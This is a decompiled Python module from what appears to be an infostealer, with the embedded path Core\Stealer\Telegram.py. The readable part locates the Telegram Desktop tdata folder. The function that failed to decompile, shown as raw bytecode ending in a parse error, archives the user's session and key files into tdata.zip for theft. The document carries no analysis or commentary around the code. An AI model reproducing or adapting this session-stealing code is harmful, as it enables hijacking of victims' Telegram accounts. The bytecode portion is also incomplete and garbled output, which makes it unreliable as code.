# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.11 (default, Jun 29 2021, 19:54:56) 
# [GCC 8.3.0]
# Embedded file name: Core\Stealer\Telegram.py
import os, zipfile
Files = [
 'D877F783D5D3EF8Cs',
 'D877F783D5D3EF8C\\maps']

def Scan():
    tdata = os.path.join(os.getenv('AppData'), 'Telegram Desktop\\tdata')
    return tdata


def TelegramSession--- This code section failed: ---

 L.  23         0  LOAD_GLOBAL              os
                2  LOAD_ATTR                path
                4  LOAD_METHOD              exists
                6  LOAD_FAST                'TelegramDir'
                8  CALL_METHOD_1         1  ''
               10  POP_JUMP_IF_TRUE     16  'to 16'

 L.  24        12  LOAD_CONST               None
               14  RETURN_VALUE     
             16_0  COME_FROM            10  '10'

 L.  26        16  LOAD_GLOBAL              zipfile
               18  LOAD_METHOD              ZipFile
               20  LOAD_FAST                'Directory'
               22  LOAD_STR                 'tdata.zip'
               24  BINARY_ADD       
               26  LOAD_STR                 'w'
               28  LOAD_GLOBAL              zipfile
               30  LOAD_ATTR                ZIP_DEFLATED
               32  CALL_METHOD_3         3  ''
               34  SETUP_WITH          106  'to 106'
               36  STORE_FAST               'Archive'

 L.  27        38  LOAD_GLOBAL              os
               40  LOAD_METHOD              chdir
               42  LOAD_FAST                'TelegramDir'
               44  CALL_METHOD_1         1  ''
               46  POP_TOP          

 L.  29        48  LOAD_GLOBAL              Files
               50  GET_ITER         
             52_0  COME_FROM            66  '66'
               52  FOR_ITER             92  'to 92'
               54  STORE_FAST               'File'

 L.  30        56  LOAD_GLOBAL              os
               58  LOAD_ATTR                path
               60  LOAD_METHOD              exists
               62  LOAD_FAST                'File'
               64  CALL_METHOD_1         1  ''
               66  POP_JUMP_IF_FALSE    52  'to 52'

 L.  31        68  LOAD_FAST                'Archive'
               70  LOAD_METHOD              write
               72  LOAD_FAST                'File'
               74  LOAD_GLOBAL              os
               76  LOAD_ATTR                path
               78  LOAD_METHOD              join
               80  LOAD_STR                 'tdata'
               82  LOAD_FAST                'File'
               84  CALL_METHOD_2         2  ''
               86  CALL_METHOD_2         2  ''
               88  POP_TOP          
               90  JUMP_BACK            52  'to 52'
               92  POP_BLOCK        
               94  LOAD_CONST               None
               96  DUP_TOP          
               98  DUP_TOP          
              100  CALL_FUNCTION_3       3  ''
              102  POP_TOP          
              104  JUMP_FORWARD        122  'to 122'
            106_0  COME_FROM_WITH       34  '34'
              106  <49>             
              108  POP_JUMP_IF_TRUE    112  'to 112'
              110  <48>             
            112_0  COME_FROM           108  '108'
              112  POP_TOP          
              114  POP_TOP          
              116  POP_TOP          
              118  POP_EXCEPT       
              120  POP_TOP          
            122_0  COME_FROM           104  '104'

Parse error at or near `DUP_TOP' instruction at offset 98